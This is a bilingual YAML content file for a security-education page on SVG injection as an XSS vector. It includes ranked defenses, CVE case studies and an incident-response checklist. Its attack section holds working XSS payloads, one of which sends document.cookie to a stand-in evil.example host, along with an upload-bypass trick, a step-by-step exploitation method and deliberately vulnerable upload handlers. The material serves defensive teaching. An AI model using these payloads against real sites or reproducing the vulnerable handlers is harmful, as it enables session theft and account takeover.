@@ -1,0 +1,402 @@
+meta:
+  id: svginjection
+  threatId: cat_1_research14
+  severity: High
+  color: '#db2777'
+  colorRgb: 219,39,119
+  cwe: CWE-79
+  cvss: '6.4'
+  standard: OWASP A03:2021
+hero:
+  titleMain: 'SVG '
+  titleGrad: Injection
+  titleTail: ''
+  topbar: SVG Injection (SVG as an XSS delivery vector)
+  lead:
+    en: 'SVG is not a picture -- it''s a live XML document, and browsers treat it that way. The single most-misunderstood fact in this class: an <img src="evil.svg"> is genuinely safe (the spec mandates a script-free "secure static mode" for that context), but the exact same file served inline, through <object>/<embed>/<iframe>, or opened by direct navigation runs its embedded script in the serving origin''s session -- full stored XSS. File-upload features that accept SVG avatars, logos, and attachments have produced a steady stream of real CVEs across WordPress plugins, bug trackers, and SaaS platforms, right through this year.'
+    pl: 'SVG to nie obrazek -- to żywy dokument XML, i przeglądarki tak go traktują. Najbardziej błędnie rozumiany fakt w tej klasie: <img src="evil.svg"> jest naprawdę bezpieczny (specyfikacja wymusza wolny-od-skryptów "bezpieczny tryb statyczny" dla tego kontekstu), ale dokładnie ten sam plik podany inline, przez <object>/<embed>/<iframe>, albo otwarty przez bezpośrednią nawigację uruchamia osadzony skrypt w sesji domeny serwującej -- pełne stored XSS. Funkcje uploadu akceptujące awatary, logo, i załączniki SVG produkowały stały strumień realnych CVE w pluginach WordPress, trackerach błędów, i platformach SaaS, jeszcze w tym roku.'
+  metrics:
+  - k: CWE-79
+    v:
+      en: Weakness ID (co-mapped with CWE-434)
+      pl: ID słabości (współ-mapowane z CWE-434)
+  - k: '6.4'
+    v: CVSS · Medium-High (representative real CVE)
+  - k: A03:2021
+    v: OWASP Top 10
+  - k: '6'
+    v:
+      en: Attack variants
+      pl: Warianty ataku
+  sources:
+  - label: SVG 2 — Security Considerations
+    url: https://www.w3.org/TR/SVG/security.html
+  - label: PortSwigger — File upload vulnerabilities
+    url: https://portswigger.net/web-security/file-upload
+  - label: NVD — CVE-2024-10222 (WordPress SVG Support)
+    url: https://nvd.nist.gov/vuln/detail/CVE-2024-10222
+  - label: W3C Wiki — SVG Security
+    url: https://www.w3.org/wiki/SVG_Security
+sectionOrder:
+- overview
+- types
+- code
+- method
+- defense
+- incidents
+- tools
+- compliance
+- ir
+- labs
+- sources
+nav:
+- id: overview
+  en: Overview
+  pl: Przegląd
+- id: types
+  en: Attack types
+  pl: Typy ataków
+- id: code
+  en: Vuln vs Secure
+  pl: Podatny vs Bezpieczny
+- id: method
+  en: Methodology
+  pl: Metodyka
+- id: defense
+  en: Defense layers
+  pl: Warstwy obrony
+- id: incidents
+  en: Real incidents
+  pl: Incydenty
+- id: tools
+  en: SAST / DAST
+  pl: SAST / DAST
+- id: compliance
+  en: Compliance
+  pl: Zgodność
+- id: ir
+  en: Incident response
+  pl: Reagowanie
+- id: labs
+  en: Practice labs
+  pl: Laboratoria
+- id: sources
+  en: Sources
+  pl: Źródła
+sections:
+  attacks:
+    title:
+      en: Attack types
+      pl: Typy ataków
+    lead:
+      en: Six variants, from the classic <script> tag through filter-evasive event handlers to the upload-validation bypasses that let a malicious SVG through the door in the first place.
+      pl: Sześć wariantów, od klasycznego tagu <script> przez uciekające przed filtrem handlery zdarzeń po obejścia walidacji uploadu które w ogóle wpuszczają złośliwy SVG przez drzwi.
+    items:
+    - name: Classic <script> element
+      sev: high
+      description:
+        en: 'SVG has its own native <script> element. It fires whenever the SVG reaches a scripted rendering context: inline in the page, through <object>/<embed>/<iframe>, or when a victim navigates directly to the file''s URL. It does NOT fire when referenced via <img src>, per the SVG spec''s mandated script-free "secure static mode" for that context.'
+        pl: 'SVG ma własny natywny element <script>. Uruchamia się gdy tylko SVG dociera do kontekstu renderowania ze skryptami: inline na stronie, przez <object>/<embed>/<iframe>, albo gdy ofiara nawiguje bezpośrednio do URL pliku. NIE uruchamia się gdy jest odwoływane przez <img src>, zgodnie z wymuszonym przez specyfikację SVG wolnym-od-skryptów "bezpiecznym trybem statycznym" dla tego kontekstu.'
+      payload: <svg xmlns="http://www.w3.org/2000/svg"><script>fetch('//evil.example/?c='+document.cookie)</script></svg>
+    - name: Event-handler payload (onload/onerror)
+      sev: high
+      description:
+        en: Event-handler attributes on SVG elements survive filters that only strip the <script> tag itself. onload on the root <svg> element fires as soon as the document renders in a scripted context.
+        pl: Atrybuty handlerów zdarzeń na elementach SVG przetrwają filtry które usuwają tylko sam tag <script>. onload na elemencie root <svg> uruchamia się gdy tylko dokument renderuje się w kontekście ze skryptami.
+      payload: <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
+    - name: SMIL animation event handlers (filter-evasive)
+      sev: high
+      description:
+        en: Animation elements (animate, animateTransform, set) with an onbegin/onend handler execute without ever using the word "script" or a top-level onload -- the exact payload PortSwigger's own SVG-markup XSS lab expects, specifically because it evades allowlists that only think to block <script> and root-level event handlers.
+        pl: Elementy animacji (animate, animateTransform, set) z handlerem onbegin/onend wykonują się bez użycia słowa "script" czy handlera onload na najwyższym poziomie -- dokładnie ładunek którego oczekuje własne laboratorium XSS znaczników SVG PortSwigger, konkretnie dlatego że unika allowlist które myślą tylko o blokowaniu <script> i handlerów zdarzeń na najwyższym poziomie.
+      payload: <svg xmlns="http://www.w3.org/2000/svg"><animatetransform onbegin="alert(1)" attributeName="transform"/></svg>
+    - name: <foreignObject> HTML smuggling
+      sev: high
+      description:
+        en: foreignObject embeds a different XML namespace (XHTML) inside the SVG, smuggling an HTML <script> or an HTML element with an event handler past sanitizers that scan for SVG-specific dangerous tags but forget the namespace switch.
+        pl: foreignObject osadza inną przestrzeń nazw XML (XHTML) wewnątrz SVG, przemycając HTML <script> albo element HTML z handlerem zdarzenia obok sanitizerów które skanują pod kątem niebezpiecznych tagów specyficznych dla SVG ale zapominają o przełączeniu przestrzeni nazw.
+      payload: <svg xmlns="http://www.w3.org/2000/svg"><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>
+    - name: MIME / Content-Type validation bypass at upload time
+      sev: high
+      description:
+        en: 'Before any script ever runs, the attacker first has to get the SVG accepted. Real, documented bypasses include naming the file .png while sending Content-Type: image/svg+xml (or vice-versa) to satisfy an extension check and a content-type check that are validated independently rather than cross-checked against the actual bytes.'
+        pl: 'Zanim jakikolwiek skrypt w ogóle się wykona, atakujący najpierw musi sprawić by SVG został zaakceptowany. Realne, udokumentowane obejścia obejmują nazwanie pliku .png wysyłając Content-Type: image/svg+xml (albo odwrotnie) by zaspokoić kontrolę rozszerzenia i kontrolę typu treści które są walidowane niezależnie zamiast być skrzyżowane z faktycznymi bajtami.'
+      payload: 'filename="avatar.png", Content-Type: image/svg+xml, body: <svg onload=alert(1)/>'
+    - name: Wormable stored XSS via a shared uploaded asset
+      sev: critical
+      description:
+        en: 'The highest-impact escalation: an uploaded avatar or logo is rendered for every user who views the attacker''s profile, forum post, or shared document -- turning a single low-privilege upload into an XSS payload that fires against every viewer, including administrators, without any further attacker action.'
+        pl: 'Eskalacja o najwyższym wpływie: wgrany awatar albo logo jest renderowane dla każdego użytkownika który ogląda profil atakującego, post na forum, albo udostępniony dokument -- zamieniając pojedynczy upload o niskich uprawnieniach w ładunek XSS który uruchamia się przeciw każdemu widzowi, włącznie z administratorami, bez żadnej dalszej akcji atakującego.'
+      payload: A subscriber-level forum avatar upload firing against every visitor, including moderators/admins, who views the profile
+  code:
+    title:
+      en: Vulnerable vs Secure
+      pl: Podatny vs Bezpieczny
+    lead:
+      en: 'Three real options, in order of robustness: sanitize with an allowlist library, or eliminate the attack surface entirely by rasterizing to a format that has no concept of a script tag.'
+      pl: 'Trzy realne opcje, w kolejności solidności: sanityzuj biblioteką allowlist, albo całkowicie wyeliminuj powierzchnię ataku rasteryzując do formatu który nie ma pojęcia tagu script.'
+    languages:
+    - label: PHP
+      lang: php
+      vulnerable: '// VULNERABLE -- trusts the extension, stores and serves raw bytes
+
+        $name = basename($_FILES[''avatar''][''name'']);
+
+        move_uploaded_file($_FILES[''avatar''][''tmp_name''], "/uploads/$name");'
+      safe: '// SECURE -- allowlist-sanitize before storing (enshrined/svg-sanitize, used by TYPO3 core)
+
+        use enshrined\svgSanitize\Sanitizer;
+
+        $dirty = file_get_contents($_FILES[''avatar''][''tmp_name'']);
+
+        $sanitizer = new Sanitizer();
+
+        $clean = $sanitizer->sanitize($dirty);  // strips <script>, on*, foreignObject, external refs
+
+        if ($clean === false) { http_response_code(422); exit(''Invalid SVG''); }
+
+        file_put_contents(''/uploads/''.bin2hex(random_bytes(16)).''.svg'', $clean);'
+    - label: JavaScript (Node.js)
+      lang: javascript
+      vulnerable: '// VULNERABLE -- raw bytes stored and served inline, same origin
+
+        fs.writeFileSync(`./public/${req.file.originalname}`, req.file.buffer);'
+      safe: "// SECURE -- DOMPurify with the SVG profile enabled\nconst createDOMPurify = require('dompurify');\nconst { JSDOM } = require('jsdom');\nconst DOMPurify = createDOMPurify(new JSDOM('').window);\nconst clean = DOMPurify.sanitize(req.file.buffer.toString('utf8'),\n  { USE_PROFILES: { svg: true, svgFilters: true } });\nfs.writeFileSync(`./uploads/${crypto.randomUUID()}.svg`, clean);"
+    - label: Python (rasterize instead)
+      lang: python
+      vulnerable: "# VULNERABLE -- accepted and served as a live SVG document\nwith open(f\"/uploads/{filename}\", \"wb\") as f:\n    f.write(uploaded_bytes)"
+      safe: '# SECURE -- eliminate the attack surface entirely by rasterizing to PNG
+
+        import cairosvg
+
+        cairosvg.svg2png(bytestring=uploaded_bytes, write_to=f"/uploads/{uuid4()}.png")
+
+        # output is inert raster data -- no <script>, no event handlers, no attack surface'
+  method:
+    title:
+      en: Attack methodology
+      pl: Metodyka ataku
+    lead:
+      en: Determining the exact rendering context is the make-or-break step -- the same payload that does nothing behind an <img> tag fires reliably on direct navigation to the same file's URL.
+      pl: Ustalenie dokładnego kontekstu renderowania to krok decydujący o wszystkim -- ten sam ładunek który nic nie robi za tagiem <img> uruchamia się niezawodnie przy bezpośredniej nawigacji do URL tego samego pliku.
+    steps:
+    - title:
+        en: Find an SVG-accepting upload sink
+        pl: Znajdź sink uploadu akceptujący SVG
+      description:
+        en: Avatar/profile picture, org logo, forum signature, ticket attachment, or "insert image" features are the classic candidates -- especially where the asset is later shown to other users.
+        pl: Awatar/zdjęcie profilowe, logo organizacji, podpis forum, załącznik zgłoszenia, albo funkcje "wstaw obraz" to klasyczni kandydaci -- szczególnie tam gdzie zasób jest później pokazywany innym użytkownikom.
+    - title:
+        en: Determine the exact rendering context
+        pl: Ustal dokładny kontekst renderowania
+      description:
+        en: 'Check how the stored file is referenced: <img src> (script blocked -- pivot elsewhere), inline/object/embed/iframe (script runs), or a raw direct URL the victim might open or be linked to (script runs as a top-level document).'
+        pl: 'Sprawdź jak przechowywany plik jest przywoływany: <img src> (skrypt zablokowany -- przejdź gdzie indziej), inline/object/embed/iframe (skrypt działa), albo surowy bezpośredni URL który ofiara może otworzyć albo do którego może zostać skierowana (skrypt działa jako dokument najwyższego poziomu).'
+    - title:
+        en: Craft the payload to the context and any filters present
+        pl: Skonstruuj ładunek dopasowany do kontekstu i obecnych filtrów
+      description:
+        en: Start with <script>; if stripped, switch to onload/onerror; if root event handlers are filtered too, use an animation-element handler (onbegin) or <foreignObject> to smuggle HTML past an SVG-only allowlist.
+        pl: Zacznij od <script>; jeśli usunięty, przejdź na onload/onerror; jeśli handlery zdarzeń na najwyższym poziomie też są filtrowane, użyj handlera elementu animacji (onbegin) albo <foreignObject> by przemycić HTML obok allowlisty tylko-SVG.
+    - title:
+        en: Confirm execution
+        pl: Potwierdź wykonanie
+      description:
+        en: A benign alert(document.domain) proves execution in the right origin; an out-of-band beacon (Burp Collaborator) confirms blind/stored execution against other viewers without needing visible output.
+        pl: Niegroźny alert(document.domain) dowodzi wykonania w odpowiedniej domenie; beacon out-of-band (Burp Collaborator) potwierdza ślepe/przechowywane wykonanie przeciw innym widzom bez potrzeby widocznego wyjścia.
+    - title:
+        en: Escalate to session theft or a wormable payload
+        pl: Eskaluj do kradzieży sesji albo ładunku samo-replikującego się
+      description:
+        en: Exfiltrate cookies/CSRF tokens for account takeover, or -- for the highest impact -- target a shared asset (avatar, logo) so the payload fires against every subsequent viewer, including higher-privileged users.
+        pl: Eksfiltruj ciasteczka/tokeny CSRF dla przejęcia konta, albo -- dla najwyższego wpływu -- celuj we współdzielony zasób (awatar, logo) tak by ładunek uruchamiał się przeciw każdemu kolejnemu widzowi, włącznie z użytkownikami o wyższych uprawnieniach.
+  defenses:
+    title:
+      en: Defense layers, ranked
+      pl: Warstwy obrony wg skuteczności
+    lead:
+      en: Rasterizing to a format with no scripting concept whatsoever is the only defense that reaches near-100% -- every other layer reduces risk without eliminating the underlying capability SVG has by design.
+      pl: Rasteryzacja do formatu bez jakiegokolwiek pojęcia skryptowania to jedyna obrona która osiąga blisko 100% -- każda inna warstwa redukuje ryzyko bez eliminowania bazowej zdolności którą SVG ma z założenia.
+    items:
+    - rank: 1
+      eff: 99
+      kind: primary
+      label:
+        en: Rasterize SVG to PNG/JPEG for display-only use
+        pl: Rasteryzuj SVG do PNG/JPEG dla użycia tylko-do-wyświetlania
+      note:
+        en: Eliminates the scripting attack surface completely -- the output format has no concept of a script tag or event handler. Loses vector scalability; harden the rasterizer itself against XXE/SSRF when it resolves external references.
+        pl: Całkowicie eliminuje powierzchnię ataku skryptowania -- format wyjściowy nie ma pojęcia tagu script czy handlera zdarzenia. Traci skalowalność wektorową; utwardź sam rasteryzator przeciw XXE/SSRF gdy rozwiązuje zewnętrzne referencje.
+    - rank: 2
+      eff: 93
+      kind: primary
+      label:
+        en: Allowlist-based SVG sanitization when vector output is required
+        pl: Sanityzacja SVG oparta na allowlist gdy wymagane jest wyjście wektorowe
+      note:
+        en: DOMPurify (SVG profile) or enshrined/svg-sanitize strip <script>, event-handler attributes, <foreignObject>, and external references. Residual risk from sanitizer bypasses -- keep the library current.
+        pl: DOMPurify (profil SVG) albo enshrined/svg-sanitize usuwają <script>, atrybuty handlerów zdarzeń, <foreignObject>, i zewnętrzne referencje. Ryzyko resztkowe z obejść sanitizera -- utrzymuj bibliotekę aktualną.
+    - rank: 3
+      eff: 88
+      kind: strong
+      label:
+        en: Serve uploads from a separate cookieless origin
+        pl: Serwuj uploady z osobnej domeny bez ciasteczek
+      note:
+        en: Doesn't stop execution, but any script that does run has no session cookies or CSRF tokens to steal from that origin -- the GitHub usercontent.com model. Strong containment even if a payload slips through.
+        pl: Nie zatrzymuje wykonania, ale jakikolwiek skrypt który się uruchomi nie ma ciasteczek sesji ani tokenów CSRF do kradzieży z tej domeny -- model GitHub usercontent.com. Silne ograniczenie skutków nawet jeśli ładunek się przemknie.
+    - rank: 4
+      eff: 85
+      kind: strong
+      label:
+        en: 'Content-Disposition: attachment + X-Content-Type-Options: nosniff'
+        pl: 'Content-Disposition: attachment + X-Content-Type-Options: nosniff'
+      note:
+        en: Forces download instead of inline render, closing the direct-navigation and object/embed vectors -- but useless for any feature that must display the SVG in-page.
+        pl: Wymusza pobranie zamiast renderowania inline, zamykając wektory bezpośredniej nawigacji i object/embed -- ale bezużyteczne dla każdej funkcji która musi wyświetlić SVG na stronie.
+    - rank: 5
+      eff: 70
+      kind: mitigation
+      label:
+        en: Validate actual file content, not extension/declared MIME type
+        pl: Waliduj faktyczną treść pliku, nie rozszerzenie/deklarowany typ MIME
+      note:
+        en: Stops the trivial extension-vs-Content-Type-header bypasses documented in real advisories, but a genuinely well-formed malicious SVG still passes a pure structural validity check -- pair with sanitization, never rely on this alone.
+        pl: Zatrzymuje trywialne obejścia rozszerzenie-vs-nagłówek-Content-Type udokumentowane w realnych poradach, ale naprawdę poprawnie sformowany złośliwy SVG wciąż przechodzi czystą kontrolę poprawności strukturalnej -- połącz z sanityzacją, nigdy nie polegaj wyłącznie na tym.
+  incidents:
+    title:
+      en: Real-world incidents
+      pl: Rzeczywiste incydenty
+    lead:
+      en: Three independently-verified CVEs spanning WordPress, a widely-used non-CMS bug tracker, and a current-year enterprise platform -- confirming this is an ongoing, cross-ecosystem pattern rather than a WordPress-specific quirk.
+      pl: Trzy niezależnie zweryfikowane CVE obejmujące WordPress, szeroko używany tracker błędów spoza CMS, i platformę enterprise z bieżącego roku -- potwierdzające że to trwały wzorzec między ekosystemami, nie tylko dziwactwo WordPress.
+    items:
+    - org: WordPress (SVG Support plugin)
+      year: 2025
+      impact: CVE-2024-10222
+      cost: Author-level stored XSS via SVG upload
+      description:
+        en: Versions <=2.5.10 lacked sufficient sanitization of uploaded SVG content, letting an Author-level (or higher) attacker upload a malicious SVG containing script that executes when the file is later served. Fixed in 2.5.11.
+        pl: Wersje <=2.5.10 nie miały wystarczającej sanityzacji wgrywanej treści SVG, pozwalając atakującemu na poziomie Autora (lub wyższym) wgrać złośliwe SVG zawierające skrypt który wykonuje się gdy plik jest później serwowany. Naprawione w 2.5.11.
+    - org: MantisBT (bug tracker)
+      year: 2022
+      impact: CVE-2022-33910
+      cost: Stored XSS via SVG file upload in a widely-deployed, non-WordPress product
+      description:
+        en: 'A concrete demonstration that this pattern is not a WordPress-plugin-ecosystem quirk -- MantisBT, a mainstream open-source bug tracker used well beyond the WordPress world, shipped the same root cause: unsanitized SVG attachments served back as live documents.'
+        pl: 'Konkretna demonstracja że ten wzorzec to nie dziwactwo ekosystemu pluginów WordPress -- MantisBT, główny otwartoźródłowy tracker błędów używany daleko poza światem WordPress, wysłał tę samą przyczynę źródłową: niesanityzowane załączniki SVG serwowane z powrotem jako żywe dokumenty.'
+    - org: Shopware
+      year: 2026
+      impact: CVE-2026-48015
+      cost: Stored XSS via SVG upload, described as having no SVG content sanitization at all in the upload pipeline
+      description:
+        en: All three independent research passes converged on this CVE and its root-cause description independently, confirming this class remains a live, current pattern in enterprise e-commerce software, not a legacy concern.
+        pl: Wszystkie trzy niezależne przejścia badawcze niezależnie zbiegły się na tym CVE i jego opisie przyczyny źródłowej, potwierdzając że ta klasa pozostaje żywym, aktualnym wzorcem w oprogramowaniu e-commerce enterprise, nie problemem historycznym.
+    inlineSources:
+    - label: NVD — CVE-2024-10222 (WordPress SVG Support)
+      url: https://nvd.nist.gov/vuln/detail/CVE-2024-10222
+    - label: 'MantisBT — issue #30384 (CVE-2022-33910)'
+      url: https://mantisbt.org/bugs/view.php?id=30384
+    - label: GitHub Advisory — Shopware CVE-2026-48015
+      url: https://github.com/shopware/shopware/security/advisories/GHSA-xvhc-gm7j-mhmc
+  tools:
+    title:
+      en: Detection tooling
+      pl: Narzędzia wykrywania
+    lead:
+      en: A dedicated Burp Suite extension exists specifically for this class -- generic scanners often miss file-upload XSS entirely because they don't adapt attacks to upload workflows.
+      pl: Istnieje dedykowane rozszerzenie Burp Suite specyficznie dla tej klasy -- generyczne skanery często całkowicie pomijają XSS przez upload plików bo nie dostosowują ataków do przepływów uploadu.
+    sast:
+    - - SCA / dependency scanners
+      - Flag outdated versions of DOMPurify/enshrined-svg-sanitize with published sanitizer-bypass CVEs -- a real, practical detection angle given the ongoing bypass research against these libraries
+    dast:
+    - - Burp Suite UploadScanner (official PortSwigger BApp)
+      - Purpose-built for file-upload testing -- specifically uploads an SVG containing a <script>/onload payload and checks the response Content-Type to reduce false positives (won't flag if served as image/png, since script would never execute there)
+    - - DOMPurify / enshrined-svg-sanitize
+      - Not detection tools but the reference sanitization implementations -- DOMPurify's SVG profile is the JS/browser-side standard; enshrined/svg-sanitize (PHP) is used by default in TYPO3 core
+    note:
+      en: <strong>Key signal:</strong> test every SVG-accepting upload feature by uploading a payload and then requesting the stored file directly by URL -- this is exactly the rendering context (top-level navigation) most likely to execute, and the one generic XSS scanners are least likely to think to check.
+      pl: <strong>Kluczowy sygnał:</strong> testuj każdą funkcję uploadu akceptującą SVG wgrywając ładunek a potem żądając przechowywanego pliku bezpośrednio przez URL -- to dokładnie kontekst renderowania (nawigacja najwyższego poziomu) najbardziej prawdopodobny do wykonania, i ten o którym generyczne skanery XSS najmniej prawdopodobnie pomyślą by sprawdzić.
+  compliance:
+    title:
+      en: Compliance quick-reference
+      pl: Szybka zgodność
+    lead:
+      en: 'A clean dual mapping, confirmed identically by all three research passes: CWE-79 for the execution outcome, CWE-434 for the architectural root cause of accepting a script-capable format into an image-upload allowlist in the first place.'
+      pl: 'Czyste podwójne mapowanie, potwierdzone identycznie przez wszystkie trzy przejścia badawcze: CWE-79 dla wyniku wykonania, CWE-434 dla architektonicznej przyczyny źródłowej zaakceptowania formatu zdolnego do skryptu w allowliście uploadu obrazów w pierwszej kolejności.'
+    items:
+    - std: CWE (MITRE)
+      items:
+      - CWE-79 — Improper Neutralization of Input During Web Page Generation (Cross-site Scripting) -- the primary mapping; every verified CVE in this deep-dive is tagged this way, since the outcome is stored XSS
+      - 'CWE-434 — Unrestricted Upload of File with Dangerous Type -- the valid co-mapping capturing the architectural root cause: accepting a script-capable document format (SVG) as if it were an inert image'
+    - std: OWASP
+      items:
+      - A03:2021 — Injection (XSS was folded into Injection in the 2021 revision) -- primary
+      - A04:2021 — Insecure Design -- secondary, for the architectural decision to accept and inline-serve untrusted SVGs from the application's own origin without sanitization or isolation
+    inlineSources:
+    - label: CWE-79 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/79.html
+    - label: CWE-434 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/434.html
+    - label: OWASP A03:2021 Injection
+      url: https://owasp.org/Top10/2021/A03_2021-Injection/
+    - label: OWASP A04:2021 Insecure Design
+      url: https://owasp.org/Top10/2021/A04_2021-Insecure_Design/
+  ir:
+    title:
+      en: Incident response checklist
+      pl: Lista kontrolna reagowania
+    lead:
+      en: If active SVG-upload XSS exploitation is confirmed, work this list top to bottom.
+      pl: Po potwierdzeniu aktywnej eksploatacji XSS przez upload SVG, przejdź tę listę od góry.
+    steps:
+    - en: Identify every user who viewed the malicious asset (avatar/logo/attachment) -- treat their sessions as potentially compromised if the payload targeted session/CSRF tokens
+      pl: Zidentyfikuj każdego użytkownika który obejrzał złośliwy zasób (awatar/logo/załącznik) -- traktuj ich sesje jako potencjalnie skompromitowane jeśli ładunek celował w tokeny sesji/CSRF
+    - en: Remove the malicious file immediately and audit for other uploads from the same account/IP
+      pl: Natychmiast usuń złośliwy plik i przeaudytuj pod kątem innych uploadów z tego samego konta/IP
+    - en: Check which rendering context triggered execution (inline, object/embed, or direct navigation) to understand the full exposure window
+      pl: Sprawdź który kontekst renderowania wywołał wykonanie (inline, object/embed, albo bezpośrednia nawigacja) by zrozumieć pełne okno ekspozycji
+    - en: Grep the codebase for every upload feature accepting SVG, not just the one exploited, and confirm each passes content through a sanitizer or rasterizer
+      pl: Przeszukaj kod pod kątem każdej funkcji uploadu akceptującej SVG, nie tylko tej która została wykorzystana, i potwierdź że każda przepuszcza treść przez sanitizer albo rasteryzator
+    - en: If any higher-privileged account (moderator/admin) viewed the asset, treat that account's session and any actions it performed afterward as suspect
+      pl: Jeśli jakiekolwiek konto o wyższych uprawnieniach (moderator/admin) obejrzało zasób, traktuj sesję tego konta i wszelkie działania które wykonało potem jako podejrzane
+    - en: Notify per applicable data-breach obligations if sessions were hijacked or data was exfiltrated
+      pl: Powiadom zgodnie z obowiązującymi wymogami dot. naruszenia danych jeśli sesje zostały przejęte lub dane wyeksfiltrowane
+  labs:
+    title:
+      en: Practice labs
+      pl: Laboratoria praktyczne
+    lead:
+      en: No PortSwigger lab combines "upload an SVG" with its solution, but a real, verified lab teaches the exact filter-evasive SVG-markup payload (animatetransform onbegin) this deep-dive covers, and PortSwigger's own file-upload material explicitly names SVG as a stored-XSS vector.
+      pl: Żadne laboratorium PortSwigger nie łączy "wgraj SVG" z własnym rozwiązaniem, ale prawdziwe, zweryfikowane laboratorium uczy dokładnie ładunku znacznika SVG unikającego filtra (animatetransform onbegin) który ten deep-dive omawia, a własny materiał o uploadzie plików PortSwigger jawnie nazywa SVG wektorem stored XSS.
+    items:
+    - variant: SMIL animation event-handler payload (filter-evasive)
+      provider: PortSwigger Web Security Academy
+      label: Reflected XSS with some SVG markup allowed
+      url: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed
+      difficulty: Practitioner
+  sources:
+    title:
+      en: Sources
+      pl: Źródła
+    items:
+    - label: SVG 2 — Security Considerations
+      url: https://www.w3.org/TR/SVG/security.html
+    - label: W3C Wiki — SVG Security
+      url: https://www.w3.org/wiki/SVG_Security
+    - label: PortSwigger — File upload vulnerabilities
+      url: https://portswigger.net/web-security/file-upload
+    - label: PortSwigger — Reflected XSS with some SVG markup allowed
+      url: https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed
+    - label: CWE-79 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/79.html
+    - label: CWE-434 (MITRE)
+      url: https://cwe.mitre.org/data/definitions/434.html
+    - label: NVD — CVE-2024-10222 (WordPress SVG Support)
+      url: https://nvd.nist.gov/vuln/detail/CVE-2024-10222
+    - label: 'MantisBT — issue #30384 (CVE-2022-33910)'
+      url: https://mantisbt.org/bugs/view.php?id=30384
+    - label: GitHub Advisory — Shopware CVE-2026-48015
+      url: https://github.com/shopware/shopware/security/advisories/GHSA-xvhc-gm7j-mhmc
+    - label: PortSwigger — UploadScanner BApp
+      url: https://github.com/PortSwigger/upload-scanner
